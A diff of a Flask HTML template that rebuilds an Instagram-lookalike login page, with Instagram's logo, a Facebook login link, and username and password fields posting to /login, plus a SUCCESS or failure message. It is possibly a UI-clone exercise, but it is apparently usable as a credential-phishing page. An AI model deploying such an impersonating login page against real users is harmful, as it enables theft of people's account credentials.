@@ -1,119 +1,176 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            width: 350px;
-            text-align: center;
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: 600;
-            color: #0095f6;
-            margin-bottom: 25px;
-            letter-spacing: -0.5px;
-        }
-        .input-group {
-            position: relative;
-            margin-bottom: 15px;
-        }
-        input {
-            width: 100%;
-            padding: 10px 10px 10px 45px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 14px;
-            box-sizing: border-box;
-            outline: none;
-            transition: border-color 0.1s;
-        }
-        input:focus {
-            border-color: #0095f6;
-        }
-        .icon {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #8e8e8e;
-            font-size: 16px;
-        }
-        button {
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            padding: 10px;
-            width: 100%;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 14px;
-            margin-top: 15px;
-        }
-        button:hover {
-            background-color: #1877f2;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 600;
-            display: none; /* Hidden by default */
-        }
-        .success { background-color: #d1fae5; color: #065f46; display: block; }
-        .failure { background-color: #fee2e2; color: #991b1b; display: block; }
-        
-        .help-link {
-            display: block;
-            text-align: center;
-            margin-top: 15px;
-            font-size: 12px;
-            color: #00376b;
-            text-decoration: none;
-            font-weight: 600;
-        }
-    </style>
+    <title>Document</title>
 </head>
+<style>
+    body {
+        background-color: black;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .main {
+        display: flex;
+        background-color: black;
+        height: 500px;
+        width: 1000px;
+        margin-top: 50px;
+    }
+
+    .pic img {
+        margin-top: 20px;
+        margin-left: 30px;
+        height: 450px;
+        width: 600px;
+        object-fit: cover; /* Image ko cover karne ke liye good hai */
+    }
+
+    .login {
+        font-family: 'Lucida Grande', 'Lucida Sans Unicode';
+        text-align: center;
+        height: 500px;
+        width: 300px;
+        color: aliceblue;
+        justify-content: center;
+    }
+
+    .login img {
+        height: 100px;
+        width: 270px;
+        margin-bottom: 10px;
+    }
+
+    input {
+        color: white;
+        height: 35px;
+        width: 270px;
+        margin: 5px;
+        background-color: #121212;
+        border: 0.1px solid gray;
+        border-radius: 3px;
+        outline: none; /* Focus hone par black border hatane ke liye */
+    }
+
+    input:focus {
+        border-color: rgb(55, 55, 183);
+    }
+
+    button {
+        margin-top: 10px;
+        color: white;
+        background-color: rgb(55, 55, 183);
+        height: 32px;
+        width: 270px;
+        border-radius: 10px;
+        border: none;
+        cursor: pointer;
+    }
+    
+    button:hover {
+        background-color: rgb(40, 40, 140);
+    }
+
+    .facebook {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .facebook img {
+        height: 25px;
+        width: 25px;
+    }
+
+    .login .facebook a{
+        color: rgb(50, 50, 228);
+        text-decoration: none;
+        font-family: Arial;
+        margin-left: 10px;
+        margin-top: 3px;  
+    }
+    
+    .login a{
+        text-decoration: none;
+        color: white;
+        font-family: Arial;
+    }
+    
+    .login p a{
+        text-decoration: none;
+        color: rgb(13, 0, 255);
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    /* Flask result message ke liye */
+    .result-message {
+        margin-top: 15px;
+        padding: 10px;
+        border-radius: 5px;
+        font-size: 14px;
+        font-weight: bold;
+        display: none;
+    }
+    
+    .success {
+        background-color: #0095f6;
+        color: white;
+        display: block;
+    }
+    
+    .failure {
+        background-color: #ff4d4d;
+        color: white;
+        display: block;
+    }
+</style>
+
 <body>
-    <div class="login-container">
-        <div class="logo">Instagram</div>
-        
-        <form action="/login" method="post">
-            <div class="input-group">
-                <span class="icon">👤</span>
-                <input type="text" name="username" placeholder="Phone number, username, or email" required>
-            </div>
-            <div class="input-group">
-                <span class="icon">🔒</span>
-                <input type="password" name="password" placeholder="Password" required>
-            </div>
-            <button type="submit">Log In</button>
-        </form>
-        
-        {% if result %}
-        <div class="status {% if 'SUCCESS' in result %}success{% else %}failure{% endif %}">
-            {{ result }}
+    <div class="main">
+        <!-- Image URL change kar diya hai URL se run karne ke liye -->
+        <div class="pic">
+            <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000&auto=format&fit=crop" alt="pic">
         </div>
-        {% endif %}
-        
-        <a href="#" class="help-link">Forgot password?</a>
+        <div class="login">
+            <!-- Logo URL -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="">
+            
+            <!-- Inputs mein name attributes add kiye hain -->
+            <input type="text" name="username" placeholder="Phone number,username, or email"><br>
+            <input type="password" name="password" placeholder="Password"><br>
+            
+            <!-- Form action aur method set kiya hain Flask ke liye -->
+            <form action="/login" method="post">
+                <button type="submit">Log in</button>
+            </form>
+
+            <div class="line">
+                <div class="left"></div>
+                <p>OR</p>
+                <div class="right"></div>
+            </div>
+            
+            <div class="facebook">
+                <img src="https://img.icons8.com/?size=96&id=118497&format=png" alt="">
+                <a href="https://www.facebook.com/r.php/">Login with Facebook</a>
+            </div>
+            
+            <a href="#" style="color: white; text-decoration: none;">Forget password?</a>
+            <p style="color: white; font-family: Arial, Helvetica, sans-serif;">Don't have an account? <a href="#" style="color: rgb(13, 0, 255); text-decoration: none;">Sign up</a></p>
+            
+            <!-- Flask result message -->
+            {% if result %}
+            <div class="result-message {% if 'SUCCESS' in result %}success{% else %}failure{% endif %}">
+                {{ result }}
+            </div>
+            {% endif %}
+        </div>
     </div>
+
 </body>
+
 </html>
